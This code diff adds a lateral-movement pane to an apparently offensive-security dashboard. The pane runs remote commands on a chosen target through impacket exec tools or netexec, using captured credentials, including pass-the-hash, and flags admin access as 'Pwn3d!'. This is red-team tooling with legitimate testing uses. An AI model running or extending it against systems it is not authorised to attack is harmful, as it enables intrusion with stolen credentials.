@@ -1270,6 +1270,44 @@ PANES.coercion = {
   }
 };
 
+// ═══════════════════════════════════════════════════════════════════════════
+//  LATERAL MOVEMENT (impacket exec family + netexec; creds from store, PtH-aware)
+// ═══════════════════════════════════════════════════════════════════════════
+const LAT_TOOL  = {psexec:'psexec',wmiexec:'wmiexec',smbexec:'smbexec',atexec:'atexec',dcomexec:'dcomexec','netexec-smb':'netexec','netexec-winrm':'netexec'};
+const LAT_LABEL = {psexec:'impacket psexec',wmiexec:'impacket wmiexec',smbexec:'impacket smbexec',atexec:'impacket atexec',dcomexec:'impacket dcomexec','netexec-smb':'netexec (SMB)','netexec-winrm':'netexec (WinRM)'};
+
+PANES.lateral = {
+  body(){ return (
+    detStrip(META.lateral)
+    + sec('LATERAL MOVEMENT',`<div data-box="gate"></div>
+        <div class="controls" style="margin-bottom:12px">${fld('TARGET',inp('target',firstIp(),'host to move to','170px'))}${fld('CREDENTIAL',sel('cred',[['','— loading —']],'300px'))}${fld('METHOD',sel('method',[['wmiexec','wmiexec (impacket)'],['psexec','psexec (impacket)'],['smbexec','smbexec (impacket)'],['atexec','atexec (impacket)'],['dcomexec','dcomexec (impacket)'],['netexec-smb','netexec · SMB'],['netexec-winrm','netexec · WinRM']],'210px'))}</div>
+        <div class="controls" style="margin-bottom:10px">${fld('COMMAND',inp('cmd','whoami /all','command to run','360px'))}</div>
+        <div class="sec-note" style="margin-bottom:10px">One-shot command on the target using a captured credential — pass-the-hash when the cred is a hash. netexec with no command just validates the credential.</div>
+        <div class="controls">${btn('▶ EXECUTE','go','run')}${btn('RECHECK','ghost sm','recheck')}</div>
+        ${statusline('IDLE','no exec running')}
+        <div class="term" data-term="ad" style="margin-top:14px"><span class="d">// remote exec output streams here</span></div>`)
+    + sec('RESULT',`<div data-box="res"><div class="sec-note">Exec verdict appears here.</div></div>`)
+  );},
+  async mount(root){
+    const setStatus=emuStatusSetter(root); let status={};
+    const evalGate=()=>{ const method=V(root,'method'); const g=adGate(status,LAT_TOOL[method],LAT_LABEL[method]); const gb=box(root,'gate'); if(gb) gb.innerHTML=g.banner; return g; };
+    const load=async()=>{ status=await api.get('/api/ad/tools'); await adLoadCreds(root); evalGate(); };
+    await load();
+    const methodEl=EL(root,'method'); if(methodEl) methodEl.addEventListener('change', evalGate);
+    onAct(root,'recheck', async()=>{ await load(); toast('Rechecked'); });
+    onAct(root,'run', async()=>{ const g=evalGate(); if(!g.ok){ toast('Selected method\u2019s tool not on PATH','err'); return; }
+      const cid=V(root,'cred'); if(!cid){ toast('Select a captured credential','warn'); return; }
+      const method=V(root,'method'); const command=V(root,'cmd');
+      if(!method.startsWith('netexec') && !command){ toast('impacket exec needs a command','warn'); return; }
+      const t=term(root,'ad'); clearTerm(t); termLine(t,'[H3x-Dash] lateral exec…','c'); setStatus('EXECUTING',true);
+      await api.stream('/api/ad/start',{tool:'lateral',method,cred_id:cid,target:V(root,'target'),command},'/api/ad/stream',
+        { term:t, onDone: m=>{ setStatus('COMPLETE',false); const v=(m.results&&m.results[0])||{}; const b=box(root,'res');
+            const cls=v.admin?'crit':(v.success?'ok':'muted'); const label=v.admin?'ADMIN (Pwn3d!)':(v.success?'SUCCESS':'FAILED');
+            b.innerHTML=`<div class="statusline"><span class="pill ${cls}">${label}</span> <span class="sec-note" style="margin:0">${esc(v.detail||'')} · ${esc(m.method||'')} \u2192 ${esc(m.target||'')}</span></div>`;
+            toast('Lateral exec complete', v.success?'ok':'warn'); } }); });
+  }
+};
+
 // ── ROADMAP CARD (panes with no backend endpoint in this build) ─────────────
 function roadmap(mod){
   const m=META[mod.id]||{};
